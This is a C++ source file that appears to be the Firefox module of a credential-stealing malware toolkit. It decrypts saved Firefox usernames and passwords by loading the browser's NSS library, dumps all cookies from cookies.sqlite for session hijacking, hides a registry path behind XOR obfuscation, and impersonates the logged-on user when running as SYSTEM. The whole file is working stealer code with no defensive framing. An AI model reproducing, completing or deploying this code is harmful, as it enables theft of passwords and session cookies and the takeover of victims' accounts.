#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iostream>
#include <sstream>

#include "FirefoxStealer.h"
#include "../crypto/Base64.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../utils/Obfuscator.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>

#pragma comment(lib, "shlwapi.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
        typedef struct SECItemStr { int type; unsigned char *data; unsigned int len; } SECItem;

        typedef SECStatus (*PK11SDR_Decrypt_t)(SECItem *data, SECItem *result, void *cx);
        typedef SECStatus (*NSS_Init_t)(const char *configdir);
        typedef SECStatus (*NSS_Shutdown_t)(void);

        HMODULE g_hNss = NULL;
        PK11SDR_Decrypt_t g_PK11SDR_Decrypt = NULL;
        NSS_Init_t g_NSS_Init = NULL;
        NSS_Shutdown_t g_NSS_Shutdown = NULL;

        std::string GetFirefoxInstallPath() {
            HKEY hKey;
            char path[MAX_PATH];
            DWORD size = sizeof(path);
            // "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe"
            std::string keyPath = utils::ws2s(utils::xor_wstr(L"\x09\x15\x1c\x0e\x0d\x1b\x08\x1f\x00\x17\x33\x39\x28\x35\x29\x35\x3c\x2e\x00\x0d\x33\x34\x3e\x35\x2d\x29\x00\x19\x2f\x28\x28\x3f\x34\x2e\x1c\x3f\x28\x29\x33\x35\x34\x00\x1b\x2a\x2a\x00\x0a\x3b\x2e\x32\x29\x00\x3c\x33\x28\x3f\x3c\x35\x22\x74\x3f\x22\x3f", 63));
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                if (RegQueryValueExA(hKey, "Path", NULL, NULL, (LPBYTE)path, &size) == ERROR_SUCCESS) {
                    RegCloseKey(hKey);
                    return std::string(path);
                }
                RegCloseKey(hKey);
            }
            return "C:\\Program Files\\Mozilla Firefox";
        }

        bool InitNSS(const std::string& profilePath) {
            if (g_hNss) return true;
            std::string nssPath = GetFirefoxInstallPath();
            SetDllDirectoryA(nssPath.c_str());
            g_hNss = LoadLibraryA("nss3.dll");
            if (!g_hNss) return false;

            g_NSS_Init = (NSS_Init_t)GetProcAddress(g_hNss, "NSS_Init");
            g_NSS_Shutdown = (NSS_Shutdown_t)GetProcAddress(g_hNss, "NSS_Shutdown");
            g_PK11SDR_Decrypt = (PK11SDR_Decrypt_t)GetProcAddress(g_hNss, "PK11SDR_Decrypt");

            if (!g_NSS_Init || !g_PK11SDR_Decrypt) return false;
            if (g_NSS_Init(profilePath.c_str()) != SECSuccess) return false;
            return true;
        }

        void ShutdownNSS() {
            if (g_NSS_Shutdown) g_NSS_Shutdown();
            if (g_hNss) FreeLibrary(g_hNss);
            g_hNss = NULL;
            SetDllDirectoryA(NULL);
        }

        std::string DecryptFirefoxString(const std::string& encryptedB64) {
            if (!g_PK11SDR_Decrypt) return "";
            std::vector<BYTE> encrypted = crypto::Base64Decode(encryptedB64);
            SECItem in = { 0, encrypted.data(), (unsigned int)encrypted.size() };
            SECItem out = { 0, NULL, 0 };
            if (g_PK11SDR_Decrypt(&in, &out, NULL) == SECSuccess) {
                std::string result((char*)out.data, out.len);
                return result;
            }
            return "";
        }

        std::vector<std::string> FindFirefoxProfiles() {
            std::vector<std::string> profiles;
            char path[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
                fs::path profilesPath = fs::path(path) / "Mozilla" / "Firefox" / "Profiles";
                if (fs::exists(profilesPath)) {
                    for (const auto& entry : fs::directory_iterator(profilesPath)) {
                        if (entry.is_directory()) profiles.push_back(entry.path().string());
                    }
                }
            }
            return profiles;
        }
    }

    std::string DumpFirefoxPasswords() {
        bool impersonated = false;
        if (utils::Shared::IsSystem()) impersonated = utils::Shared::ImpersonateLoggedOnUser();
        std::vector<std::string> profiles = FindFirefoxProfiles();
        std::stringstream report;
        report << "FIREFOX_PASSWORDS_DUMPED:\n";
        bool foundAny = false;
        for (const auto& profile : profiles) {
            fs::path loginsPath = fs::path(profile) / "logins.json";
            if (!fs::exists(loginsPath)) continue;
            if (!InitNSS(profile)) continue;
            try {
                std::ifstream f(loginsPath);
                nlohmann::json j;
                f >> j;
                if (j.contains("logins")) {
                    for (const auto& login : j["logins"]) {
                        std::string url = login.value("hostname", "N/A");
                        std::string user = DecryptFirefoxString(login.value("encryptedUsername", ""));
                        std::string pass = DecryptFirefoxString(login.value("encryptedPassword", ""));
                        if (!user.empty() || !pass.empty()) {
                            report << url << " | " << user << " | " << pass << "\n";
                            foundAny = true;
                        }
                    }
                }
            } catch (...) {}
            ShutdownNSS();
        }
        if (impersonated) utils::Shared::RevertToSelf();
        return foundAny ? report.str() : "No Firefox credentials found.";
    }

    std::string StealFirefoxCookies() {
        bool impersonated = false;
        if (utils::Shared::IsSystem()) impersonated = utils::Shared::ImpersonateLoggedOnUser();
        std::vector<std::string> profiles = FindFirefoxProfiles();
        std::stringstream resultSS;
        resultSS << "# FIREFOX COOKIE STEALER RESULTS\n";
        int cookieCount = 0;
        for (const auto& profile : profiles) {
            fs::path cookiesDbPath = fs::path(profile) / "cookies.sqlite";
            if (!fs::exists(cookiesDbPath)) continue;
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            std::string tempDb = std::string(tempPath) + "cookies_fx_" + std::to_string(GetTickCount()) + ".sqlite";
            CopyFileA(cookiesDbPath.string().c_str(), tempDb.c_str(), FALSE);
            sqlite3* db;
            if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                const char* query = "SELECT host, path, isSecure, expiry, name, value FROM moz_cookies";
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
                        const char* path = (const char*)sqlite3_column_text(stmt, 1);
                        int isSecure = sqlite3_column_int(stmt, 2);
                        sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                        const char* name = (const char*)sqlite3_column_text(stmt, 4);
                        const char* value = (const char*)sqlite3_column_text(stmt, 5);
                        resultSS << (host?host:"") << "\tTRUE\t" << (path?path:"") << "\t" << (isSecure?"TRUE":"FALSE") << "\t" << expiry << "\t" << (name?name:"") << "\t" << (value?value:"") << "\n";
                        cookieCount++;
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            DeleteFileA(tempDb.c_str());
        }
        if (impersonated) utils::Shared::RevertToSelf();
        if (cookieCount == 0) return "No Firefox cookies found.";
        return resultSS.str();
    }
}
